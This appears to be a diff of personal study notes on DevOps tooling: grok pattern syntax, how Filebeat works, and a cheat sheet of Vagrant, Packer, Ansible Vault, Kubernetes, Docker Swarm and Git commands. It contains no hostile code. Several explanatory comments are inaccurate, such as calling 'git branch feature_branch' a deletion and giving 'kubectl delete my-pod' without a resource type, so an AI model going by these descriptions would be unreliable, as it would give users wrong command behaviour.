+Groks works by using grok patterns. Syntax for a grok pattern is %{SYNTAX:SEMANTIC}
+SYNTAX is the name of the pattern that will match your text:
+    - 3.44 will match the NUMBER.
+    - 55.3.244.1 will match the IP pattern.
+SEMANTIC is the identifier you give to the piece of text being matched.
+    - 3.44 could be the duration of an event.
+    - 55.3.244.1 client making a request.
+Example:
+    %{NUMBER:duration}%{IP:client}
+
+Another example:
+    55.3.244.1 GET /index.html 15824 0.043
+    %{IP:client} %{WORD:method} %{URIPATHPARAM:request} %{NUMBER:bytes} %{NUMBER:duration}
+
+After the grok filter, the event will have a few extra fields in it:
+    - client: 55.3.244.1
+    - method: GET
+    - request: /index.html
+    - bytes: 15824
+    - duration: 0.043
+
+FILEBEAT:
+Filebeat is a lightweight shipper for forwarding and centralizing log data either to ElasticSearch or LogStash.
+File monitors the log files or locations that you specify, collect log events.
+There are two major components of Filebeat:
+    - Inputs. Responsible for managing the Harvesters. Find all the sources that need to be run from. It will create a Harvester for each individual log file.
+    - Harvesters. Responsible for read the content of the log files line by line. Can be set for multi-line reading.
+How it works:
+    1. It starts an inputs that look in the specified location for log data.
+    2. Filebeat starts a harvester for each log.
+    3. The harvester read a single log for new content (unless multi-line read is configured).
+    4. Then sends the new log data to libbeat.
+    5. Libbeat aggregates the events and sends the aggregated data to an output.
+
+----------------------------------------------- MISCELLANEOUS -----------------------------------------------
+[COMMANDS]
+VAGRANT INSTALLATION ####################################################################
+yum install -y https://releases.hashicorp.com/vagrant/2.2.9/vagrant_2.2.9_x86_64.rpm    # Installs the RPM package of Vagrant.
+vagrant --version                                                                       # Displays the Vagrant version.
+
+VAGRANT #####################################################
+vagrant init                                                # Sets a Vagrant environment (Vagrantfile) in current dir.
+vagrant init hashicorp/precise64                            # Sets a Vagrant environment (Vagrantfile) in current dir with the box specified
+vagrant up                                                  # Configures the guest machines based on Vagrantfile.
+vagrant up web                                              # Create only the web virtual machine specified in the Vagrantfile.
+vagrant destroy                                             # Destroy all the guest machines.
+vagrant validate                                            # Validates the syntax of the Vagrantfile in the current directory.
+vagrant provision --provision-with shell                    # It will run guest machines using the provisioner shell.
+vagrant reload                                              # Restart all guests machines.
+vagrant status                                              # Checks the status of the guest machines.
+vagrant ssh -c 'ls /'                                       # Runs the ls command via ssh in the default guest machine.
+vagrant halt                                                # Halt all the environment (all guest machines).
+vagrant halt default                                        # Halt only the guest machine default.
+vagrant ssh-config                                          # Display the host ssh information.
+vagrant box add --name ubuntu64 package.box                 # Creates a box named ubuntu64 base on the file box package.box.
+vagrant box list                                            # Lists all the boxes installed in the system,
+vagrant box outdated --global                               # Display all the outdated boxes installed on the system.
+vagrant update --box centos/7                               # Updates the centos/7 box.
+vagrant box prune -n                                        # It will display all the boxes that can be pruned.
+vagrant box prune                                           # Prune the old-version boxes.
+vagrant box repackage ubuntu64 virtualbox 0                 # Repackages the box 'ubuntu64'.
+vagrant box remove ubunt64                                  # Removes the box ubuntu64.
+
+PACKER ######################################################
+packer validate packer.json                                 # Validates the syntax in the template packer.json.
+packer build -var 'tag=0.0.1' packer.json                   # Builds a package machine image.
+
+ANSIBLE #########################################################################################
+ansible-vault create foo.yml                                                                    # Creates an encrypted file.
+ansible-vault encrypt foo.yml bar.yml                                                           # Encrypts the files.
+ansible-vault decrypt foo.yml bar.yml                                                           # Decrypts the encrypted files.
+ansible-vault edit foo.yml                                                                      # Edit the encrypted file.
+ansible-vault rekey foo.yml bar.yml                                                             # Resets the passphrase in encrypted files.
+ansible-vault view foo.yml                                                                      # Display the content of the encrypted file.
+ansible-vault encrypt_string --vault-id PASSWORDFILE 'CONTENTOFSTRING' --name 'NAMEOFSTRING'    # Encrypts a string using the PASSWORDFILE.
+
+KUBERNETES ######################################################
+kubectl create -f pod.yml                                       # Creates a pod based on the definition file.
+kubectl get pods                                                # Lists the pods.
+kubectl delete my-pod                                           # Deletes the pod.
+kubectl create -f replicaset.yml                                # Creates a replica set based on the definition file.
+kubectl get replicasets                                         # Lists the replica sets.
+kubectl scale --replicas=4 replicaset/my-replicaset             # Scale my-replicaset to 4 replicas.
+kubectl delete replicaset my-replicaset                         # Deletes the replica set.
+kubectl create -f deployment.yml                                # Creates a deployment based on the definition file.
+kubectl get deployments                                         # Lists the deployments.
+kubectl scale --replicas=4 deployment/nginx-deployment          # Scale nginx-deployment to 4 replicas.
+kubectl delete deployment nginx-deployment                      # Deletes the deployment.
+
+DOCKER SWARM ####################################################################
+docker swarm init --advertise-addr 192.168.1.12                                 # Initialize the Docker Swarm using specified IP.
+docker swarm update --autolock=true                                             # Modify the swarm to lock it.
+docker service create -p 8080:80 --replicas=2 --name=nginx-test nginx:latest    # Creates a service of 2 tasks on port 8080 using nginx latest image.
+docker service create -p 8081:80 --mount source=swarm-vol,dest=/usr/share/nginx/html --replicas=2 --name=nging-vol nginx:latest     # Creates a service of 2 tasks on port 8080 using a volume.
+docker service update --replicas=1 nginx-test                                   # Updates the service to only have 1 task.
+docker service scale nginx-test=4                                               # Updates the service to have 4 replicas/tasks.
+
+DOCKER MACHINE ##############################################
+docker-machine version                                      # Display the Docker Machine version.
+docker-machine create -d virtualbox my-vbox                 # Creates a virtualbox Docker Machine called my-vbox.
+eval $(docker-machine env my-vbox)                          # Activates the Docker Machine.
+
+GIT #############################################################
+git init                                                        # Initializes a git repo in the current directory.
+git status                                                      # Display the status of current Git repository.
+git add .                                                       # Stage any files in the current directory.
+git commit -am "Adding index file."                             # Commit the staged changes with the comment specified.
+git commit --amend -m "Last commit updated."                    # Modify last commit with new staged changes.
+git rm --cached file1                                           # Removed changes made in file1 from the staged changes.
+git rm file2                                                    # Removes the file2 from the repository (it will generate a new un-staged change, and you will need to stage and commit the change).
+git reset --hard                                                # Resets back to the state of the previous commit.
+git revert HEAD                                                 # Reverts the working directory into the state before the HEAD (last) commit.
+git mv myfile myDir/myfile                                      # Moves the position of the file.
+git push origin master                                          # Push the commits to the remote repository from the master branch.
+git pull origin master                                          # Pulls the un-synched commits from origin/master.
+git branch                                                      # Display the current branch.
+git remote -v                                                   # Display your current remote repositories.
+git remote add origin git@github.com:luisnaranjo/git-test.git   # Configures the remote repository in origin.
+git config --global user.name "My user"                         # Sets the user name.
+git config --global user.email "myuser@example.com"             # Sets the user's email.
+git log                                                         # Displays the commit history.
+git show                                                        # Displays last commit along with the changes made to files in that commit.
+git diff index.html                                             # Display the changes made since last commit.
+git branch                                                      # Display current branches.
+git branch dev                                                  # Creates the 'dev' branch in current repository.
+git branch feature_branch                                       # Removes the branch if fully merged.
+git checkout dev                                                # Switches you to the dev branch.
+git checkout dev && git merge feature_branch                    # Merge the feature_branch into dev branch.
+git checkout dev && git rebase new_feature                      # Merge the new_feature into dev branch.
+git submodule add https://github.com/luisnaranjo/git-test.git   # Adds the external repository as a submodule.
+git tag                                                         # Display all tags in repository.
+git tag v1.0                                                    # Add a tag to the current commit in current branch.
+git push origin v1.0                                            # Push the tag to the remote repo.
+git tag -d v1.0                                                 # Deletes the tag.
+
+
+[FILES]
+GIT #################
+.gitmodules         # File containing the submodules specifications (module, path & url).
+
+
+[MISCELLANEOUS]
+OTHER COURSES:
+- Learning Vagrant.
+- Using Ansible for Configuration Management and Deployments.
+- Docker Certified Associate Prep Course or Docker Deep Dive.
+- Certified Kubernetes Administrator (CKA).
+- CoreOS Essentials.
+- Implementing a Full CI/CD Pipeline.
+- Source Control with Git.
+- Elastic Stack Essentials.
